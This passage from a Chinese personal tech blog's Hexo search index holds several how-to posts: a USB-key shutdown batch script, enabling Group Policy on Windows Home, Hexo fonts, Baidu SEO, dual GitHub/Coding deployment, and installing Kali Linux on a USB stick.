data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201120302.webp" alt=""></p><p>找到你刚刚藏到C盘中的 <code>.bat</code> 文件一路确定保存</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201120350.webp" alt=""></p><p>这样你的简易「加密狗」就完成了。开机如果不插入U盘的话将会自动关机。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200201120452.gif" alt=""></p><p>原理是开机启动 C 盘中的 <code>.bat</code> 文件，执行命令检查 F 盘中的 认证文件，如果没有找到文件将自动关机。</p><p>家庭版没有自带「组策略」，需要先安装「组策略」，做法是在桌面新建一个「文本文档」并在其中输入以下内容后保存。</p><pre><code>pushd "%~dp0"dir /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txtdir /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txtfor /f %%i in ('findstr /i . List.txt 2^&gt;nul') do dism /online /norestart /add-package:"C:\Windows\servicing\Packages\%%i"</code></pre><p>将文本文档修改为 <code>.bat</code> 扩展，右键已管理员身份运行，这样系统会下载安装「组策略」。</p><p>建议将C盘中的 <code>.bat</code> 文件和U盘中的认证文件都隐藏避免误删。</p><p>如果你的 U 盘丢了，可以重新制作一个 认证文件放到新的 U 盘中，或进 PE 删除 .bat 文件。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何优雅提取app软件的apk格式中的字体？</title>
      <link href="/posts/58245.html"/>
      <url>/posts/58245.html</url>
      
        <content type="html"><![CDATA[<p>1、下载apk格式的指定app软件；</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200131185939.png" alt=""></p><p>2、将apk格式的文件名更改为后缀名为zip格式；</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200131185940.png" alt=""></p><p>3、用winrar或者7-zip…解压软件解压，然后就找到其中的ttf格式的字体文件。</p><p>举例说明，我想找到XX纸条APP中使用的字体。那么先下载然后修改为如下的zip文件，然后解压出来，然后再找到解压出来的文件夹，然后直接搜索fonts文件夹，然后再找到ttf文件。如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200131185941.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200131185943.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200131185942.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matery自定义字体</title>
      <link href="/posts/34148.html"/>
      <url>/posts/34148.html</url>
      
        <content type="html"><![CDATA[<h3 id="全局自定义字体"><a href="#全局自定义字体" class="headerlink" title="全局自定义字体"></a>全局自定义字体</h3><p>1.在hexo根目录找到 <strong>source\font</strong> 文件(没有就创建一个，名字也可以自定义)<br>2.找到 <strong>themes\matery\source\css\my.css</strong> 粘贴以下代码进去即可</p><pre><code>@font-face{    font-family: '字体名字';    src: url('../font/你的字体.ttf');}body{    font-family: '字体名字';}</code></pre><ul><li>全局自定义步骤如图：</li></ul><p>1、<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200131184237.png" alt=""></p><p>2、<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200131184238.png" alt=""></p><p>3、<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200131184239.png" alt=""></p><p>4、<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200131184240.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo百度SEO优化</title>
      <link href="/posts/40881.html"/>
      <url>/posts/40881.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这之前，<strong>有个事情需要注意：</strong></p><p><code>GitHub</code>是不允许百度的<code>Spider</code>（蜘蛛）爬取<code>GitHub</code>上的内容的，所以任何部署在GitHub上的静态博客都是不能百度爬取到的！</p><ul><li><p>解决方案</p><ul><li><p>将hexo部署在国内的代码托管平台 例Coding、码云</p></li><li><p>双部署的话，进行dns解析，让国内用户走Coding 即可。有写过文章。</p></li></ul></li></ul></blockquote><ul><li>测试百度Spider能不能爬你的域名</li></ul><ul><li><p>在任意目录下执行以下命令（将“你的域名”换成你的域名）</p><pre class=" language-sh"><code class="language-sh">curl -A "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" -o example.html 你的域名</code></pre></li></ul><p>执行完命令，在该目录下会生成一个文件：<code>example.html</code>，打开它，如果显示</p><ul><li><p><code>Moved Permanently</code>，说明301，被重定向了</p></li><li><p><code>Found</code>，也就是爬到了</p></li><li><p>如果打开是你的首页，说明爬取到的内容就是你的首页HTML内容。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200130144804.png" alt=""></p></li></ul><h4 id="让百度收录你的站点"><a href="#让百度收录你的站点" class="headerlink" title="让百度收录你的站点"></a>让百度收录你的站点</h4><p><a href="https://ziyuan.baidu.com/site/index#/" target="_blank" rel="noopener">登录百度资源平台</a> 登陆成功之后就可以在<strong>站点管理</strong>进行<strong>网站绑定</strong></p><p><a href="https://ziyuan.baidu.com/site/siteadd" target="_blank" rel="noopener">添加网站</a>，输入域名，三步走。</p><p>第三步验证网站的时候， 验证网站所有权的方式有三种：</p><ul><li>文件验证</li><li><code>HTML</code>标签验证</li><li><code>CNAME</code>解析验证<strong>（推荐使用）</strong></li></ul><p>同理，百度的spider是爬取不到GitHub的内容的，所以<code>HTML标签验证</code>方式也是不太可取的。</p><h4 id="如何像百度推送我的网站呢？"><a href="#如何像百度推送我的网站呢？" class="headerlink" title="如何像百度推送我的网站呢？"></a>如何像百度推送我的网站呢？</h4><p>绑定之后百度蜘蛛就知道我们的网站存在了，<del>就相当于 你刚出生需要去派出所登记户口册一样</del>；但是百度蜘蛛还不知道我们的网站内容，所以接下来我们得向百度推送博客文章的url</p><p>还是在百度资源搜索平台，找到数据引入-&gt;链接提交，可以看到向百度推送自己的内容有两个方式：</p><ol><li><code>自动提交</code> （分三种）<ul><li>主动推送</li><li>自动推送</li><li>sitemap（站点地图）</li></ul></li><li><code>手动提交</code><ul><li>即手动地将链接一次性提交给百度</li></ul></li></ol><p>一般自动提交比手动提交效果好一点，自动提交又从效率上来说：</p><p><strong>主动推送&gt;自动推送&gt;sitemap</strong></p><p><strong>自动提交的三种方式</strong>：</p><ol><li><code>主动推送</code>：最为快速的提交方式。将站点当天新产出链接通过此方式推送给百度，以保证新链接可以及时被百度收录。</li><li><code>自动推送</code>：最为便捷的提交方式。将自动推送的JS代码部署在站点的每一个页面源代码中，当部署代码的页面在每次被浏览时，链接就会被自动推送给百度。可以与主动推送配合使用。</li><li><code>sitemap</code>：您可以定期将网站链接放到<code>sitemap文件</code>中，然后将<code>sitemap文件</code>提交给百度。百度会周期性的抓取检查您提交的<code>sitemap</code>，对其中的链接进行处理，但收录速度慢于主动推送。</li></ol><h4 id="使用sitemap方式推送"><a href="#使用sitemap方式推送" class="headerlink" title="使用sitemap方式推送"></a>使用sitemap方式推送</h4><p><strong>安装sitemap插件</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-sitemap --save <span class="token function">npm</span> <span class="token function">install</span> hexo-generator-baidu-sitemap --save</code></pre><p>这两个插件是用来生成 <code>Sitemap文件</code> 的插件，而 <code>Sitemap</code> 是用来告知搜索引擎我们的网站上有哪些可供抓取的网页的。</p><p><strong>注意一点：</strong><br><strong>hexo配置文件中的url一定要改成你的域名，这两个插件是根据你的url生成站点地图的。</strong></p><p>安装后直接执行<code>hexo cl&amp;&amp;hexo g</code>命令，然后就会在网站根目录生成<code>sitemap.xml</code>文件和<code>baidusitemap.xml文件</code>，其中<code>sitemap.xml</code>文件是搜索引擎通用的文件，<code>baidusitemap.xml</code>是百度专用的<code>sitemap</code>文件。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200130141054.png" alt=""></p><p>有<code>sitemap文件</code>之后，再将生成的<code>sitemap文件</code>提交给百度或者其他搜索引擎</p><p>百度方式：在自动提交的sitemap那里填写自己<code>sitemap文件</code>的URL地址即可</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//你的域名/baidusitemap.xml</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200130141142.png" alt=""></p><p>提交后会有状态提示：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200130141213.png" alt=""></p><p>这里需要注意<strong>严格区分http和https</strong></p><blockquote><p>http和https是不一样的，刚添加的站点是HTTP协议的，如果你网站开启了 <code>强制https</code>，是会报301重定向错误的，也就是百度不能抓取到你的sitemap</p><p>如果想用https，可以在<code>数据监控</code>-&gt;<code>HTTPS认证</code>进行认证</p><p>这个认证有时会很慢，可以在你的站点只留一个首页的<code>简单HTML</code>，然后再去百度认证，这样应该会快一点。</p></blockquote><p>如果是其他的搜索引擎，一般是在填写sitemap的地方，填写以下内容即可</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">https:</span>//你的域名/sitemap.xml</code></pre><h4 id="自动推送方式"><a href="#自动推送方式" class="headerlink" title="自动推送方式"></a>自动推送方式</h4><p>我所使用的matery主题可以自动给每个页面加上这段代码，只需在主题配置文件中配置：</p><pre class=" language-yml"><code class="language-yml"># 百度搜索资源平台提交链接baiduPush: true</code></pre><h4 id="主动推送方式"><a href="#主动推送方式" class="headerlink" title="主动推送方式"></a>主动推送方式</h4><p>安装主动推送插件：<a href="https://github.com/huiwang/hexo-baidu-url-submit" target="_blank" rel="noopener">hexo-baidu-url-submit</a></p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-baidu-url-submit --save</code></pre><p>然后打开<code>hexo配置文件</code>，也就是博客根目录 在末尾加入以下配置：</p><pre class=" language-yml"><code class="language-yml"># hexo-baidu-url-submit  百度主动推送baidu_url_submit:  count: 111 # 提交最新的一个链接  host: www.thecat.top # 在百度站长平台中注册的域名  token: xxxxxxx # 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!  path: baidu_urls.txt # 文本文档的地址， 新链接会保存在此文本文档里</code></pre><p>密匙的获取是在百度的自动提交的主动推送那里。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200130144435.png" alt=""></p><p>再加入新的<code>deploy</code>：</p><pre class=" language-yml"><code class="language-yml">deploy:- type: baidu_url_submitter</code></pre><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200130144509.png" alt=""></p><p>配置完之后，每次我们提交代码托管库的时候，，，新的链接就会被推送到百度</p><p>推送成功时,会有如下终端提示!</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200130144540.png" alt=""></p><p>各种不同的推送反馈字段说明<a href="https://ziyuan.baidu.com/college/courseinfo?id=267&amp;page=2#h2_article_title12" target="_blank" rel="noopener">点我</a>查看，一般来说，推送失败基本都是地址不相符造成的，我们只需对比<code>baidu_url_submit</code>在<code>public</code>中生成的<code>baidu_urls.txt</code>的地址,与自己填写在<code>host</code>字段中的地址对比看是否一样即可。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux没有IPv4地址解决方法</title>
      <link href="/posts/undefined.html"/>
      <url>/posts/undefined.html</url>
      
        <content type="html"><![CDATA[<p>我的kali是烧录在U盘的<br>运行环境为U盘<br>kali能够检测到网卡 但是没有ipv4地址解决方法</p><ul><li><p>打开文件夹,找到系统文件;  </p><p>路径:/etc/network/interfaces打开文本interfaces;</p></li></ul><p>配置网卡:<br>auto lo<br>iface lo inet loopback<br>auto eth0<br>iface eth0 inet dhcp<br>之后保存文本;</p><ul><li><p>激活网卡  </p><p>终端输入命令</p></li></ul><p>etc/init.d/networking restart<br>回车,看到ok表示激活成功.</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200130095443.jpg" alt=""></p><p>此时终端输入ifconfig就会发现有了ipv4地址.说明已经成功连接到网络.</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200130095411.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何优雅的将kali系统安装在U盘</title>
      <link href="/posts/61329.html"/>
      <url>/posts/61329.html</url>
      
        <content type="html"><![CDATA[<p>制作Kail Linux U盘Live版Persistence（持久化）的改造<br>kali系统不建议直接装到本机，因为这样容易受到攻击！<br>建议直接装到虚拟机或者U盘中&gt;&gt;&gt;&gt;<br>很多朋友也许遇到过这样的情况，安装kali到u盘中reboot computer之后数据不会保存。</p><p>刚开始安装kali到U盘中，每次配置好中文以及阿里云的源时~<br>重启电脑时每次都不会保存<del>~</del>wdnmd<br>于是<a href="http://www.thecat.top">偏锋小白菜</a></p><p>开启了折腾之路<del>~<br>最终经过长达几小时的折腾，还是将U盘数据持久化了</del></p><p><strong>工欲善其事必先利其器</strong><br>接下来步入主题如何优雅的将kali安装到U盘并且实现数据持久化。<br>一个随身携带的kali系统，就好比一把趁手的利剑。直击敌人的心脏！</p><p>网上有用vm虚拟机将kali系统写入U盘，但是个人觉得这个写入过程非常的猥琐！<br>我喜欢复杂的事情 简单做。</p><p>这里呢我推荐两款烧录工具<br>1、Rufus<br>2、UUI<br>[下载地址：<a href="https://www.lanzous.com/b0bq49xpe" target="_blank" rel="noopener">https://www.lanzous.com/b0bq49xpe</a></p><p>密码:ftou][2]<br><em>烧录操作基本上都是自动化的。</em></p><p>烧录好之后进入BIOS<br>选择U盘启动<br>kali的boot menu<br>选择第四个启动选项Persistence进入系统即可完成数据持久化。</p><p>tip:U盘引导选择Live USB Persistence项引导进入Kail Linux就完成了，这时候所有的设置、更新、保存操作都可以持久化了，就可以借助U盘实现Kail Linux在任意电脑上都可以引导使用了。  </p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200130094453.webp" alt=""></p><p>欢迎进入Kail Linux的“渗透测试”世界！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> IT技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用GitHub+Coding双部署实现国内外网站加速</title>
      <link href="/posts/6001.html"/>
      <url>/posts/6001.html</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>昨天在教大哥搭建hexo过程中出现了很多莫名其妙的问题（<del>很多地方都报错，但是都一一解决了，，，，不是到什么原因导致本地文件上传GitHub很慢，，，，</del>） </p><p>在配置好hexo之后，我们发现访问网站很慢，HTML加载完了，，，CSS、JS和４K图片都没有加载出来（气氛瞬间变得尴尬啦） 但又不是我们使用的主题的问题，那么就是网络环境的影响，即使最后我们使用了创宇云CDN加速，但还是没有我们国内的网站访问起来快速，（听说去美国的服务器要经过太平洋下面的区域,那访问起来也算是挺快了啊）,</p><h2 id="这个时候双部署出现啦"><a href="#这个时候双部署出现啦" class="headerlink" title="这个时候双部署出现啦"></a>这个时候双部署出现啦</h2><p>那我们就可以让我们的网站在国内和国外各部署一份,然后国内的用户访问国内的Coding或者码云,国外的用户访问国外的GitHub，进行分流。</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><ul><li>首先我们打开<a href="https://coding.net/" target="_blank" rel="noopener">Coding官网</a>进行账号的注册 <a href="https://e.coding.net/signup?from=net&amp;_ga=2.65836072.709564922.1580182809-963943904.1580182809" target="_blank" rel="noopener">免费注册</a></li></ul><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p><a href="https://cat00011cat.coding.net/user/projects" target="_blank" rel="noopener">新建项目</a>  代码托管项目</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128143815.png" alt=""></p><p>接下来按照我的的格式填写，避免出现错误</p><p><code>cat00011cat.coding.me</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128143952.png" alt=""></p><ul><li>创建好之后，我们找到<strong>项目设置</strong> <strong>功能开关</strong>  开启 <strong>构建与部署</strong>  </li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128144116.png" alt=""></p><h2 id="生成并配置公钥"><a href="#生成并配置公钥" class="headerlink" title="生成并配置公钥"></a><del>生成</del>并配置公钥</h2><p>之前我们已经在部署Github的时候已经生成过.SSH啦，，这里就不用重新生成啦，，，因为GitHub和ssh密钥和Coding是通用的</p><p>找到id_rsa.pub并打开。将密钥复制到Coding上，，，</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128144416.png" alt=""></p><ul><li>个人设置——》》SSH公钥——》》添加公钥</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128144815.png" alt=""></p><p>配置完成</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128145142.png" alt=""></p><h2 id="修改-config"><a href="#修改-config" class="headerlink" title="修改_config"></a>修改_config</h2><ul><li>配置deploy</li></ul><blockquote><p>Github配置</p></blockquote><pre><code>deploy:type: gitrepository: git@github.com:lateral404/lateral404.github.io.gitbranch: master</code></pre><blockquote><p>Coding配置</p></blockquote><pre><code>deploy：type: gitrepository: git@e.coding.net:cat00011cat/cat00011cat.coding.me.gitbranch: master</code></pre><blockquote><p>双部署</p></blockquote><pre><code>deploy:  type: git  message: ""  repo:     github: git@github.com:lateral404/lateral404.github.io.git,master    coding: git@e.coding.net:cat00011cat/cat00011cat.coding.me.git,master</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128145340.png" alt=""></p><ul><li>Coding地址：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128151037.png" alt=""></p><p>这里部署好就可以开始上传啦。。</p><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><ul><li><p>输入命令hexo cl &amp;&amp; hexo g &amp;&amp; hexo d</p></li><li><p>清空 生成 并部署</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128150336.png" alt=""></p></li></ul><p>国外：域名解析线路走国外    GitHub</p><p>国内：域名解析线路默认   Coding</p><p>这样就实现了网站加速，上传速度也快了。</p><h2 id="开启Coding-Pages"><a href="#开启Coding-Pages" class="headerlink" title="开启Coding Pages"></a>开启Coding Pages</h2><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128151340.png" alt=""></p><ul><li>手动部署/一般是自动部署</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128151339.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128151338.png" alt=""></p><ul><li>这个错误可能是deploy配置不当导致的，，，导致原因有很多，（已解决）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128150803.png" alt=""></p><ul><li>至于这个错误，我也不知道如何解决，，，反正不影响 部署，那就先不管。（未解决）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200128150700.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>迁移Hexo报错ERRORPluginloadfailed:hexo-filer-github-emojis</title>
      <link href="/posts/17628.html"/>
      <url>/posts/17628.html</url>
      
        <content type="html"><![CDATA[<h2 id="Hexo迁移报错"><a href="#Hexo迁移报错" class="headerlink" title="Hexo迁移报错"></a>Hexo迁移报错</h2><p>今天将hexo迁移到另一台设备，结果发现报错<code>ERROR Plugin load failed:hexo-filer-github-emojis</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200126050313.png" alt=""></p><ul><li><p>解决方法</p><p>重新安装<code>npm install hexo-filter-github-emojis --save</code></p></li><li><p><code>hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</code>清空 生成 并 预览</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200126051022.PNG" alt=""></p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+DaoVoice实现网页在线及时通讯功能</title>
      <link href="/posts/19433.html"/>
      <url>/posts/19433.html</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><p>博客已经有留言功能，为什么还要加入这个功能呢？</p><p>因为评论留言我不可能一秒不离开的守着博客看，而且反馈较慢；毕竟自己还很菜，需要不断学习。现在DaoVoice彻底解决了这个痛点；</p><p>及时在线通讯，直接联系到作者。有问题或者咨询，可以第一时间得到反馈。并且DaoVoice现在打通了微信端，在网页上发送的消息，会直接推送到作者的微信上，另有小程序支持消息回复等，非常方便。</p><h3 id="食用步骤"><a href="#食用步骤" class="headerlink" title="食用步骤"></a>食用步骤</h3><ul><li><p>1、注册DaoVioce，<a href="http://dashboard.daovoice.io" target="_blank" rel="noopener">注册页面直达</a></p><ul><li><p>注册登录地址如下:</p><p><a href="http://www.daovoice.io/" target="_blank" rel="noopener">http://www.daovoice.io/</a></p><p>官网进行注册,需要邀请码: b6dbddb6 复制粘贴就可以了~!</p><p>或者通过下面链接进入：</p><p><a href="http://dashboard.daovoice.io/get-started?invite_code=b6dbddb6" target="_blank" rel="noopener">http://dashboard.daovoice.io/get-started?invite_code=b6dbddb6</a></p></li></ul></li></ul><p>这里可以使用Github账号授权快速登录。</p><ul><li><p>2、获取App Id  </p><p>注册成功后，第一次登录，会弹出一个窗口，填完相关信息后。点击应用设置，点击安装到网站，然后就可以找到我们需要的appid了。</p></li><li><p>3、最后找到主题目录下的<code>_config.yml</code>打开并配置App Id     DaoVioce<del>默认禁用</del></p><p>如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200125012501.PNG" alt=""></p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo配置留言评论篇</title>
      <link href="/posts/64593.html"/>
      <url>/posts/64593.html</url>
      
